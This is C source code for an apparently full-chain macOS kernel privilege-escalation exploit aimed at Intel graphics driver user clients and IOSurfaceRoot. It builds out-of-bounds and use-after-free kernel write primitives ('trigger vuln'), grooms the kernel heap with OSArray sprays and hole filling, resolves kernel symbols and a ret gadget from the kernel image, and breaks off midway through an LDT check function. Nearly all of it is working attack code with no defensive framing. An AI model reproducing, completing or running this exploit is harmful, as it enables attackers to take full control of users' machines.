#include "eop_common.h"

#ifdef FULLCHAIN
#include "../fullchain.h"
#else
#define GLOB
#define CSTR(x) x
#endif

#include "kernel_sc.h"
#include "kernel_sc_imports.h"

// constants for binary serialization
enum {
	kOSSerializeDictionary   = 0x01000000,
	kOSSerializeArray        = 0x02000000,
	kOSSerializeSet          = 0x03000000,
	kOSSerializeNumber       = 0x04000000,
	kOSSerializeSymbol       = 0x08000000,
	kOSSerializeString       = 0x09000000,
	kOSSerializeData         = 0x0a000000,
	kOSSerializeBoolean      = 0x0b000000,
	kOSSerializeObject       = 0x0c000000,
	kOSSerializeTypeMask     = 0x7F000000,
	kOSSerializeDataMask     = 0x00FFFFFF,
	kOSSerializeEndCollection = 0x80000000,
    kOSSerializeBinarySignature = 0xd3,
};

#define die(s, ...) do { printf("(errno %d) " s, errno, ##__VA_ARGS__); while(1) sleep(1); } while(0)

#define kIGAccelVideoContextMedia 0x101
#define kIGAccelVideoContextMain 0x100
#define kIGAccelCommandQueue 8
#define kIOAccelSharedUserClient2 6
#define kSubmitDataBuffers 2
#define kGetDataBuffer 3
#define kCreateResource 0
#define kDeleteResource 1
#define kCreateShmem 7
#define kDeleteShmem 8

// selectors for IOSurfaceRootUserClient
#define kCreateSurface 0
#define kDeleteSurface 1
#define kSurfaceSetValue 9
#define kSurfaceGetValue 10
#define kSurfaceRemValue 11

// selectors for IGAccelCommandQueue
#define kSetNotificationPort 0
#define kSubmitCommandBuffers 1
struct submit_entry {
    unsigned int kcmd_shmid;
    unsigned int cmd_shmid;
    unsigned long unk0;
    unsigned long unk1;
};
struct sIOAccelCommandQueueSubmitArgs {
    unsigned int unused;
    unsigned int count;
    struct submit_entry ents[1];
};

struct rsrc_list_ent {
    unsigned int ids[18];
    unsigned short flags[7];
    unsigned short count;
};
struct rsrc_list_hdr {
    unsigned int d0;
    unsigned int d4;
    unsigned int start;
    unsigned int size;
    unsigned int n_total_ents;
    unsigned int n_ents;
    struct rsrc_list_ent ents[0];
};
struct shmem {
    void* base;
    unsigned int sz;
    unsigned int id;
};

struct OSObject_vtbl {
    char gap0[0x48];
    unsigned long taggedRetain;
    unsigned long taggedRelease;
};
struct OSSerializer {
    unsigned long vtable;
    int retainCount;
    unsigned int unk;
    unsigned long target;
    unsigned long ref;
    unsigned long callback;
};
struct IOAccelContextGetDataBufferIn {
    unsigned int dbclass;
    unsigned int desired_sz;
};
struct IOAccelContextGetDataBufferOut {
    unsigned long addr;
    unsigned long size;
    unsigned long gpu_addr;
    unsigned long shared_ro;
    unsigned long shared_rw;
    unsigned int rsrc_id;
    unsigned int d2c;
};
struct IOAccelContextSubmitDataBuffersIn {
    unsigned int d0;
    unsigned int num_dbclasses;
    unsigned long buflens[16];
};
struct IOAccelContextSubmitDataBuffersOut {
    unsigned long q0;
    unsigned long q8;
    unsigned long q10;
    struct IOAccelContextGetDataBufferOut outs[16];
};
struct IOAccelNewResourceArgs {
    unsigned int type;
    unsigned int cache_mode;
    unsigned short plane_width;
    unsigned short plane_height;
    unsigned short short0;
    unsigned short short1;
    unsigned long q10;
    unsigned long plane_bytes_per_row;
    unsigned char some_count;
    unsigned char plane_count;
    unsigned char other_count;
    unsigned char plane_elem_width;
    unsigned int flags;
    unsigned long q28;
    unsigned long q30;
    unsigned long q38;
    unsigned long q40;
    unsigned long q48;
    unsigned long q50;
    unsigned long wire_down_sz;
    unsigned int parent_id;
    unsigned int d64;
    unsigned char data[0xe60];
};
struct IOAccelNewResourceReturnData {
    unsigned long q0;
    unsigned long map;
    unsigned long shared_ro;
    unsigned long shared_rw;
    unsigned long q20;
    unsigned long resident_size;
    unsigned long global_id;
    unsigned long q38;
    unsigned long q40;
    unsigned long protOpts;
    unsigned long q50;
};
#define RSRCID(rsrc) (*(unsigned int*)((rsrc)->shared_ro+0x100))

#define SKL 7000
#define KBL 8000
#define ICL 9000

GLOB io_service_t accel_svc;
GLOB int driver_version;
GLOB io_connect_t vidctx_main, vidctx_main2, shared_client;
GLOB struct IOAccelContextGetDataBufferOut dbuf0, uaf_dbuf;
GLOB unsigned long kdbuf0;
GLOB mach_vm_address_t sideband, sideband2;
GLOB mach_vm_size_t sideband_sz, sideband2_sz;
GLOB struct IOAccelNewResourceReturnData parent_rsrc;
GLOB unsigned int parent_id;
GLOB unsigned long gpu_addr;
GLOB void* bigmem;
GLOB io_connect_t cmdq;
GLOB struct shmem cmd_shm, kcmd_shm;
GLOB IONotificationPortRef notifi_ref;

#define MACH_MSG_MAX 0x2ffffb4
#define MAX_TRAILER_SZ 0x44
#define MACH_MSG_KSZ(usz) ((usz)+0x4c+4*(((usz)-0x1c)/0xc))
#define MACH_MSG_USZ(ksz) (((3*(ksz)-0xc8)/4+3)&~3)
#define DESC_COUNT(msg) (((mach_msg_base_t*)(msg))->body.msgh_descriptor_count)
#define PORT_DESC(msg) ((mach_msg_port_descriptor_t*)((mach_msg_base_t*)(msg)+1))
GLOB mach_port_t corpse;

GLOB io_service_t sroot_svc;
GLOB io_connect_t sroot_client;
GLOB unsigned int surf_id;
#define kIOSurfaceRootUserClient 0

#define KERN_PTR(x) (((x)>>40)==0xffffff)

GLOB void* kfile;
GLOB long kfile_sz;
GLOB char* kstrtab;
GLOB struct nlist_64* ksymtab;
GLOB unsigned int knumsyms;
GLOB unsigned long kernel_slide;
GLOB unsigned long ret_gadg;

unsigned long get_idt() {
    char idtbuf[10];
    asm volatile("sidt (%0)" : : "r" (&idtbuf) : "memory");
    return *(unsigned long*)&idtbuf[2];
}
unsigned long get_gdt() {
    char gdtbuf[10];
    asm volatile("sgdt (%0)" : : "r" (&gdtbuf) : "memory");
    return *(unsigned long*)&gdtbuf[2];
}

void parse_kernel_macho() {
    int fd = open(CSTR("/System/Library/KernelCollections/BootKernelExtensions.kc"), O_RDONLY);
    if (fd < 0)
        die("unable to open kernel file to find symbol offsets\n");
    kfile_sz = lseek(fd, 0, SEEK_END);
    if (kfile_sz == -1)
        die("unable to seek to end of kernel file\n");
    kfile = mmap(0, kfile_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (kfile == MAP_FAILED)
        die("couldnt mmap kernel file\n");
    close(fd);

    struct mach_header_64* hdr = kfile+0x10000;
    struct load_command* cmds = (void*)(hdr+1);
    struct load_command* cmd = cmds;

    // get symtab/strtab
    for (int i = 0; i < hdr->ncmds; i++, cmd = (void*)cmd+cmd->cmdsize)
        if (cmd->cmd == LC_SYMTAB) {
            struct symtab_command* symtab = (void*)cmd;
            knumsyms = symtab->nsyms;
            ksymtab = kfile+symtab->symoff;
            kstrtab = kfile+symtab->stroff;
            break;
        }
    if (!ksymtab)
        die("couldnt find symtab/strtab\n");

    // find text section
    cmd = cmds;
    unsigned char* text = 0;
    unsigned long textaddr = 0;
    unsigned long textsz = 0;
    for (int i = 0; i < hdr->ncmds && !textaddr; i++, cmd = (void*)cmd+cmd->cmdsize)
        if (cmd->cmd == LC_SEGMENT_64) {
            struct segment_command_64* seg = (void*)cmd;
            if (seg->initprot == (PROT_READ|PROT_EXEC)) {
                struct section_64* sec = (void*)(seg+1);
                for (int i = 0; i < seg->nsects; i++, sec++)
                    if (!strcmp(sec->segname, CSTR("__TEXT")) && !strcmp(sec->sectname, CSTR("__text"))) {
                        text = kfile+sec->offset;
                        textaddr = sec->addr;
                        textsz = sec->size;
                        break;
                    }
            }
        }
    if (!text)
        die("couldnt find text section\n");

    // search for ret gadget
    unsigned char* p = memchr(text, 0xc3, textsz);
    if (!p)
        die("couldnt find ret gadget\n");
    ret_gadg = textaddr+p-text;
}
unsigned long find_sym(char* name) {
    // iterate over symbols in symtab
    for (unsigned int i = 0; i < knumsyms; i++) {
        char* sym = &kstrtab[ksymtab[i].n_un.n_strx];
        if (sym[0] == '_' && !strcmp(sym+1, name))
            return ksymtab[i].n_value + kernel_slide;
    }
    die("unable to resolve kernel symbol %s\n", name);
    return 0;
}
unsigned long find_dblmap_sym(char* name) {
    // find functions/symbols in dblmap (__HIB section of kernel)
    return get_idt()-0xffffff800010c000+find_sym(name)-kernel_slide;
}

io_connect_t open_ioaccel_svc() {
    io_connect_t conn = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceNameMatching(CSTR("IntelAccelerator")));
    if (conn == MACH_PORT_NULL)
        die("couldnt find service\n");

    // identify which processor we're on
    CFStringRef cf_bundle_ident = CFStringCreateWithCString(kCFAllocatorDefault, CSTR("CFBundleIdentifier"), kCFStringEncodingUTF8);
    CFStringRef ident_ref = IORegistryEntryCreateCFProperty(conn, cf_bundle_ident, kCFAllocatorDefault, 0);
    if (!ident_ref)
        die("couldnt obtain CFBundleIdentifier property\n");
    if (CFGetTypeID(ident_ref) != CFStringGetTypeID())
        die("identifier not a string\n");
    char ident_str[0x100];
    memset(&ident_str, 0, sizeof(ident_str));
    if (!CFStringGetCString(ident_ref, ident_str, sizeof(ident_str), kCFStringEncodingUTF8))
        die("couldnt get identifier c-string\n");
    if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelICLGraphics")))
        driver_version = ICL;
    else if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelKBLGraphics")))
       driver_version = KBL;
    else if (!strcmp(ident_str, CSTR("com.apple.driver.AppleIntelSKLGraphics")))
       driver_version = SKL;
    else
        die("unknown graphics driver: %s\n", ident_str);
    CFRelease(cf_bundle_ident);
    CFRelease(ident_ref);

    return conn;
}
io_connect_t open_vidctx() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIGAccelVideoContextMain, &conn);
    if (err != KERN_SUCCESS)
        die("unable to open video context media user client: 0x%x\n", err);
    return conn;
}
io_connect_t open_shared_client() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIOAccelSharedUserClient2, &conn);
    if (err != KERN_SUCCESS)
        die("unable to open shared user client: 0x%x\n", err);
    return conn;
}
void connect_client(io_connect_t a, io_connect_t b) {
    kern_return_t err = IOConnectAddClient(a, b);
    if (err != KERN_SUCCESS)
        die("couldnt connect clients: 0x%x\n", err);
}
io_connect_t open_cmdq() {
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t err = IOServiceOpen(accel_svc, mach_task_self(), kIGAccelCommandQueue, &conn);
    if (err != KERN_SUCCESS)
        die("couldnt create command queue: 0x%x\n", err);
    return conn;
}
void create_shmem(unsigned long sz, struct shmem* out) {
    unsigned long long msz = sz;
    unsigned long outsz = sizeof(*out);
    kern_return_t err = IOConnectCallMethod(shared_client, kCreateShmem, &msz, 1, 0, 0, 0, 0, out, &outsz);
    if (err != KERN_SUCCESS)
        die("couldnt create shmem: 0x%x\n", err);
}
void cmdq_setup() {
    cmdq = open_cmdq();
    connect_client(cmdq, shared_client);
    notifi_ref = IONotificationPortCreate(kIOMasterPortDefault);
    if (!notifi_ref)
        die("couldnt create notification port\n");
    mach_port_t notifi_port = IONotificationPortGetMachPort(notifi_ref);
    struct {
        mach_port_t port;
        void (*fptr)();
        unsigned long qq;
    } ref = {0};
    ref.port = notifi_port;
    kern_return_t err = IOConnectCallAsyncScalarMethod(cmdq, kSetNotificationPort, notifi_port, (void*)&ref, 1, 0, 0, 0, 0);
    if (err != KERN_SUCCESS)
        die("couldnt set notification port: 0x%x\n", err);
    create_shmem(0x1000, &cmd_shm);
    create_shmem(0x1000, &kcmd_shm);
}
kern_return_t delete_resource(unsigned int id) {
    unsigned long long m_id = id;
    return IOConnectCallScalarMethod(shared_client, kDeleteResource, &m_id, 1, 0, 0);
}
unsigned int create_resource(unsigned int typ, unsigned long sz, unsigned long val, unsigned int parent_id, struct IOAccelNewResourceReturnData* out) {
    struct IOAccelNewResourceArgs rsrc_args = {0};
    rsrc_args.type = typ;
    rsrc_args.some_count = 1;
    rsrc_args.wire_down_sz = sz;
    rsrc_args.plane_bytes_per_row = 1; // needs to be nonzero for bind_resource
    rsrc_args.parent_id = parent_id;
    if (parent_id)
        rsrc_args.flags |= 0x800;
    rsrc_args.q40 = val;
    unsigned long outsz = sizeof(*out);
    kern_return_t err = IOConnectCallMethod(shared_client, kCreateResource, 0, 0, &rsrc_args, sizeof(rsrc_args), 0, 0, out, &outsz);
    if (err != KERN_SUCCESS)
        die("unable to create resource: 0x%x\n", err);
    return RSRCID(out);
};

kern_return_t submit_data_buffers(io_connect_t ctx) {
    struct IOAccelContextSubmitDataBuffersIn submit_arg = {
        0, 0, {0}
    };
    struct IOAccelContextSubmitDataBuffersOut submit_out = {0};
    unsigned long submit_out_sz = sizeof(submit_out);
    return IOConnectCallStructMethod(ctx, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &submit_out_sz);
}
unsigned int create_iosurface() {
    static GLOB unsigned int props[] = {
        kOSSerializeBinarySignature,
        kOSSerializeDictionary | kOSSerializeEndCollection | 1,
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // IOSurfaceAllocSize
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };
    unsigned int out[0xf60/4];
    unsigned long outsz = sizeof(out);
    kern_return_t err = IOConnectCallStructMethod(sroot_client, kCreateSurface, props, sizeof(props), out, &outsz);
    if (err != KERN_SUCCESS)
        die("couldnt create surface: 0x%x\n", err);
    return out[6];
}
kern_return_t delete_surface(unsigned int id) {
    unsigned long long m_id = id;
    return IOConnectCallScalarMethod(sroot_client, kDeleteSurface, &m_id, 1, 0, 0);
}
kern_return_t set_surface_val(void* val, unsigned long sz) {
    unsigned int setval_out = 0;
    unsigned long tmpsz = sizeof(setval_out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceSetValue, val, sz, &setval_out, &tmpsz);
}
kern_return_t rem_surface_val(void* params, unsigned long params_sz) {
    unsigned int out;
    unsigned long outsz = sizeof(out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceRemValue, params, params_sz, &out, &outsz);
}
kern_return_t get_surface_val(char* key) {
    unsigned int alloc_sz = ((strlen(key)+4)&~3)+4*2;
    unsigned int* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    pl[0] = surf_id;
    pl[1] = 0;
    strcpy((char*)(pl+2), key);
    char out[0x10];
    unsigned long outsz = sizeof(out);
    return IOConnectCallStructMethod(sroot_client, kSurfaceGetValue, pl, alloc_sz, out, &outsz);
}

void vidctx_setup() {
    kern_return_t err;

    accel_svc = open_ioaccel_svc();
    printf("IntelAccelerator: 0x%x\n", accel_svc);
    vidctx_main = open_vidctx();
    vidctx_main2 = open_vidctx();
    printf("IGAccelVideoContextMain: 0x%x 0x%x\n", vidctx_main, vidctx_main2);
    shared_client = open_shared_client();
    printf("IOAccelSharedUserClient2: 0x%x\n", shared_client);

    // connect vidctx to shared client to "start" it
    connect_client(vidctx_main, shared_client);
    connect_client(vidctx_main2, shared_client);

    // create a parent resource
    parent_id = create_resource(0, 0x1000, 0, 0, &parent_rsrc);
    printf("parent: 0x%lx 0x%x\n", parent_rsrc.map, parent_id);

    // for some reason it doesnt process sideband buffers the first time, just unsets a byte
    // that allows processing the second time
    // this also allocs dbuf0 (but it is lazily mapped into kernelspace)
    struct IOAccelContextSubmitDataBuffersIn submit_arg = {
        0, 0, {1ul<<63}
    };
    struct IOAccelContextSubmitDataBuffersOut submit_out = {0};
    unsigned long tmp_sz = sizeof(submit_out);
    err = IOConnectCallStructMethod(vidctx_main, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &tmp_sz);
    if (err != KERN_SUCCESS)
        die("couldnt do initial submit_data_buffers: 0x%x\n", err);
    dbuf0 = submit_out.outs[0];
    printf("dbuf: 0x%lx 0x%lx 0x%x\n", dbuf0.addr, dbuf0.size, dbuf0.rsrc_id);
    err = IOConnectCallStructMethod(vidctx_main2, kSubmitDataBuffers, &submit_arg, sizeof(submit_arg), &submit_out, &tmp_sz);
    if (err != KERN_SUCCESS)
        die("couldnt do initial submit_data_buffers for ctx2: 0x%x\n", err);
    uaf_dbuf = submit_out.outs[0];
    printf("uaf_dbuf: 0x%lx 0x%lx 0x%x\n", uaf_dbuf.addr, uaf_dbuf.size, uaf_dbuf.rsrc_id);

    // map sideband buffer
    err = IOConnectMapMemory(vidctx_main, 0, mach_task_self(), &sideband, &sideband_sz, kIOMapAnywhere);
    if (err != KERN_SUCCESS)
        die("couldnt map sideband buffer: 0x%x\n", err);
    printf("sideband: 0x%llx 0x%llx\n", sideband, sideband_sz);
    err = IOConnectMapMemory(vidctx_main2, 0, mach_task_self(), &sideband2, &sideband2_sz, kIOMapAnywhere);
    if (err != KERN_SUCCESS)
        die("couldnt map sideband buffer 2: 0x%x\n", err);
    printf("sideband2: 0x%llx 0x%llx\n", sideband2, sideband2_sz);
}

void cmd_write64(io_connect_t ctx, unsigned int dbuf_id, mach_vm_address_t sideband, unsigned int idx, unsigned long val) {
    // create the resource to bind
    struct IOAccelNewResourceReturnData binder;
    unsigned int binder_id = create_resource(0, 0x1000, val-gpu_addr, parent_id, &binder);

    unsigned int* sb = (void*)sideband+16;
    unsigned int off = idx&~0x1ff;
    idx &= 0x1ff;

    // prepend a token to bind dbuf0
    ((unsigned short*)sb)[0] = 0x0; // token_id
    ((unsigned short*)sb)[1] = 3; // token_size
    sb[1] = 0; // db0_off
    sb[2] = dbuf_id; // rsrc id
    sb = sb+((unsigned short*)sb)[1];

    // trigger vuln
    ((unsigned short*)sb)[0] = 0x8300; // token_id
    ((unsigned short*)sb)[1] = 9; // token_size
    sb[1] = off/4; // db0_off
    sb[3] = 0; // resource id (none) in process_token_VPHAL
    unsigned int* cmd = sb+5;
    cmd[0] = 1 | (binder_id<<16) | ((idx/4)<<3);
    cmd[1] = 0; // offset added to gpu_addr lo32
    cmd[2] = 0; // signal end

    submit_data_buffers(ctx);

    delete_resource(binder_id);
}
void oob_write32(unsigned int val) {
    cmd_write64(vidctx_main, dbuf0.rsrc_id, sideband, dbuf0.size-4, (unsigned long)val<<32);
}
void uaf_write64(unsigned int off, unsigned long val) {
    cmd_write64(vidctx_main2, uaf_dbuf.rsrc_id, sideband2, uaf_dbuf.size-0x1000+off, val);
}

void alloc_dbuf0() {
    // this will alloc and then release dbuf0's buffer
    // however as long as no other allocs cause it to "gc" it's fine
    // alloc big rsrc to ensure new map
    // then release and alloc pad rsrc, then dbuf0
    // finally reset hint to original map
    struct IOAccelNewResourceReturnData big_rsrc = {0}, pad_rsrc = {0}, reset_rsrc = {0};
    unsigned int big_id = create_resource(0, 0x20000000, 0, 0, &big_rsrc);
    unsigned int pad_id = create_resource(0, 0x20000000-dbuf0.size, 0, 0, &pad_rsrc);
    unsigned int reset_id = create_resource(0, 0x1000, 0, 0, &reset_rsrc);

    struct sIOAccelCommandQueueSubmitArgs submit_args = {0};
    submit_args.count = 1;
    submit_args.ents[0].kcmd_shmid = kcmd_shm.id;
    submit_args.ents[0].cmd_shmid = cmd_shm.id;
    unsigned int* kcmd = kcmd_shm.base;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 0; // rsrc idx
    kcmd[6] = 0; // no prev buffer
    kcmd[4] = 0; // shmem offset
    kcmd[2] = 0; // other shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 1;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10011;
        kcmd[1] = 0x14;
        kcmd[3] = 2; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10012;
        kcmd[1] = 0x18;
        kcmd[3] = 2; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10012;
        kcmd[1] = 0x14;
        kcmd[3] = 3;
        kcmd[2] = 0;
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10013;
        kcmd[1] = 0x18;
        kcmd[3] = 3;
        kcmd[2] = 0;
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    unsigned int* cmd = cmd_shm.base;
    cmd[3] = 0x100; // total size
    cmd[2] = 1; // count
    struct rsrc_list_hdr* rlist = (void*)&cmd[4];
    rlist->start = 0; // start in kcmd
    rlist->n_ents = 1;
    rlist->n_total_ents = 4;
    rlist->ents[0].count = 4;
    rlist->ents[0].ids[0] = big_id;
    rlist->ents[0].ids[1] = pad_id;
    rlist->ents[0].ids[2] = dbuf0.rsrc_id;
    rlist->ents[0].ids[3] = reset_id;
    rlist->ents[0].flags[0] = 4; // pass some check
    rlist->ents[0].flags[1] = 4;
    rlist->ents[0].flags[2] = 4;
    rlist->ents[0].flags[3] = 4;
    rlist->size = (void*)kcmd-kcmd_shm.base; // size of kcmd opcodes
    IOConnectCallStructMethod(cmdq, kSubmitCommandBuffers, &submit_args, sizeof(submit_args), 0, 0);

    delete_resource(big_id);
    delete_resource(pad_id);
    delete_resource(reset_id);

    cmd_write64(vidctx_main, dbuf0.rsrc_id, sideband, 0, 0);
    gpu_addr = *(unsigned long*)dbuf0.addr;
    printf("parent gpu_addr: 0x%lx\n", gpu_addr);
}

void iosurface_setup() {
    kern_return_t err;

    sroot_svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceNameMatching(CSTR("IOSurfaceRoot")));
    if (sroot_svc == MACH_PORT_NULL)
        die("couldnt find IOSurfaceRoot service\n");
    printf("IOSurfaceRoot service: 0x%x\n", sroot_svc);
    err = IOServiceOpen(sroot_svc, mach_task_self(), kIOSurfaceRootUserClient, &sroot_client);
    if (err != KERN_SUCCESS)
        die("couldnt open IOSurfaceRootUserClient: 0x%x\n", err);
    printf("IOSurfaceRootUserClient: 0x%x\n", sroot_client);
    surf_id = create_iosurface();
    printf("surface_id: 0x%x\n", surf_id);
}

void alloc_osarray(unsigned int capacity, char* key, unsigned int nbool) {
    unsigned alloc_sz = ((strlen(key)+4)&~3) + 4*(6+nbool);
    void* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    unsigned int* cur = pl;
    *cur++ = surf_id;
    *cur++ = 0;
    *cur++ = kOSSerializeBinarySignature;
    *cur++ = kOSSerializeArray | 2;
    *cur++ = kOSSerializeArray | (capacity/8);
    for (unsigned int i = 0; i < nbool; i++)
        *cur++ = kOSSerializeBoolean | 0 | (i == nbool-1 ? kOSSerializeEndCollection : 0);
    *cur++ = kOSSerializeString | strlen(key) | kOSSerializeEndCollection;
    strcpy((char*)cur, key);
    kern_return_t err = set_surface_val(pl, alloc_sz);
    if (err != KERN_SUCCESS)
        die("couldnt alloc OSArray %s : 0x%x\n", key, err);
}
void free_osarray(char* key) {
    unsigned alloc_sz = ((strlen(key)+4)&~3) + 4*2;
    void* pl = malloc(alloc_sz);
    memset(pl, 0, alloc_sz);
    unsigned int* cur = pl;
    *cur++ = surf_id;
    *cur++ = 0;
    strcpy((char*)cur, key);
    kern_return_t err = rem_surface_val(pl, alloc_sz);
    if (err != KERN_SUCCESS)
        die("couldnt free OSArray %s : 0x%x\n", key, err);
}

void fill_bigmem() {
    bigmem = mmap(0, 0x800000000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (bigmem == MAP_FAILED)
        die("couldnt mmap bigmem\n");
    for (unsigned long i = 0; i < 0x800000000; i+=0x10000)
        *(char*)(bigmem+i) = 0;
}

void fill_kernel_map() {
    char valname[0x40];
    // fill up kernel virtual space
    // we want to make sure there are no 0x801000 holes available
    // first some pre-fillers to fill up holes
    // then more 0x801000 allocations with 0x800000 holes in between
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("prefiller_%u"), i);
        alloc_osarray(0x800000, valname, 1);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("hole_%u"), i);
        alloc_osarray(0x800000, valname, 1);
        sprintf(valname, CSTR("filler_%u"), i);
        alloc_osarray(0x801000, valname, 1);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("hole_%u"), i);
        free_osarray(valname);
    }
}

void free_kernel_map_fillers() {
    char valname[0x40];
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("prefiller_%u"), i);
        free_osarray(valname);
    }
    for (int i = 0; i < 32; i++) {
        sprintf(valname, CSTR("filler_%u"), i);
        free_osarray(valname);
    }
}

void alloc_corpse() {
    kern_return_t err;
    err = task_generate_corpse(mach_task_self(), &corpse);
    printf("corpse: 0x%x\n", corpse);
    if (err != KERN_SUCCESS)
        die("couldnt gen corpse: 0x%x\n", err);
}

void alloc_uaf_dbuf() {
    // alloc uaf_dbuf at end of new map, after footprint
    // first ref dbuf0 so it doesnt get gc'd
    // alloc big rsrc to ensure new map
    // then release and alloc pad_rsrc, then uaf_dbuf
    // then alloc pad_rsrc2 which will fill space before dbuf0
    // finally reset hint to original map
    struct IOAccelNewResourceReturnData big_rsrc = {0}, pad_rsrc = {0}, pad_rsrc2 = {0}, reset_rsrc = {0};
    unsigned int big_id = create_resource(0, 0x20000000, 0, 0, &big_rsrc);
    unsigned int pad_id = create_resource(0, 0x20000000-uaf_dbuf.size, 0, 0, &pad_rsrc);
    unsigned int pad2_id = create_resource(0, 0x20000000-dbuf0.size, 0, 0, &pad_rsrc2);
    unsigned int reset_id = create_resource(0, 0x1000, 0, 0, &reset_rsrc);

    struct sIOAccelCommandQueueSubmitArgs submit_args = {0};
    submit_args.count = 1;
    submit_args.ents[0].kcmd_shmid = kcmd_shm.id;
    submit_args.ents[0].cmd_shmid = cmd_shm.id;
    unsigned int* kcmd = kcmd_shm.base;
    kcmd[0] = 0x10000;
    kcmd[1] = 0x1c;
    kcmd[3] = 0; // rsrc idx
    kcmd[6] = 0; // no prev buffer
    kcmd[4] = 0; // shmem offset
    kcmd[2] = 0; // other shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    if (driver_version == ICL) {
        kcmd[0] = 0x10011; // store dbuf0 ref
        kcmd[1] = 0x14;
        kcmd[3] = 0; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = 0;
    }
    else {
        kcmd[0] = 0x10012; // store dbuf0 ref
        kcmd[1] = 0x18;
        kcmd[3] = 0; // rsrc idx
        kcmd[2] = 0; // shmem offset
        kcmd[4] = kcmd[5] = 0;
    }
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000; // ref big resource
    kcmd[1] = 0x1c;
    kcmd[3] = 1;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10000; // release, ref dbuf0
    kcmd[1] = 0x1c;
    kcmd[3] = 0;
    kcmd[6] = 0;
    kcmd[4] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10003; // ref pad, uaf_dbuf, pad2, then reset
    kcmd[1] = 0x20;
    kcmd[5] = 2; // rsrc idx
    kcmd[3] = 3; // 2nd rsrc idx
    kcmd[4] = 4; // 3rd rsrc idx
    kcmd[6] = 5; // 4th rsrc idx
    kcmd[7] = 0; // dont default gpu_addr to 0
    kcmd[2] = 0; // shmem offset
    kcmd = (void*)kcmd+kcmd[1];;
    kcmd[0] = 0x10003; // release all refs except dbuf0 and uaf_dbuf0 so they are most recently used
    kcmd[1] = 0x20;
    kcmd[5] = kcmd[3] = 0;
    kcmd[4] = kcmd[6] = 3;
    kcmd[7] = 0;
    kcmd[2] = 0;
    kcmd = (void*)kcmd+kcmd[1];;
    unsigned int* cmd = cmd_shm.base;
    cmd[3] = 0x100; // total size
    cmd[2] = 1; // count
    struct rsrc_list_hdr* rlist = (void*)&cmd[4];
    rlist->start = 0; // start in kcmd
    rlist->n_ents = 1;
    rlist->n_total_ents = 6;
    rlist->ents[0].count = 6;
    rlist->ents[0].ids[0] = dbuf0.rsrc_id;
    rlist->ents[0].ids[1] = big_id;
    rlist->ents[0].ids[2] = pad_id;
    rlist->ents[0].ids[3] = uaf_dbuf.rsrc_id;
    rlist->ents[0].ids[4] = pad2_id;
    rlist->ents[0].ids[5] = reset_id;
    rlist->ents[0].flags[0] = 4; // pass some check
    rlist->ents[0].flags[1] = 4;
    rlist->ents[0].flags[2] = 4;
    rlist->ents[0].flags[3] = 4;
    rlist->ents[0].flags[4] = 4;
    rlist->ents[0].flags[5] = 4;
    rlist->size = (void*)kcmd-kcmd_shm.base; // size of kcmd opcodes
    IOConnectCallStructMethod(cmdq, kSubmitCommandBuffers, &submit_args, sizeof(submit_args), 0, 0);

    delete_resource(big_id);
    delete_resource(pad_id);
    delete_resource(pad2_id);
    delete_resource(reset_id);
}

void check_ldt(void* desc, unsigned long n) {
    struct real_descriptor {
        uint32_t limit_low:16,
                 base_low:16,
                 base_med:8,
                 access:8,
                 limit_high:4,
                 granularity:4,
                 base_high:8;
    };
#define SZ_64 0x2
#define ACC_A 0x01
#define ACC_P 0x80
#define ACC_PL_U 0x60
#define ACC_DATA 0x10
#define ACC_DATA_W 0x12
#define ACC_DATA_E 0x14
#define ACC_DATA_EW 0x16
#define ACC_CODE 0x18
#define ACC_CODE_R 0x1a
#define ACC_CODE_C 0x1c
#define ACC_CODE_CR 0x1e
#define BAD_DESC(dp, msg, ...) do {printf("bad ent: 0x%016lx\n", *(long*)(dp)); die(msg "\n", ##__VA_ARGS__);} while (0)
    struct real_descriptor* dp = desc;
    for (unsigned long i = 0; i < n; i++, dp++) {
        switch (dp->access & ~ACC_A) {
            case 0:
                break;
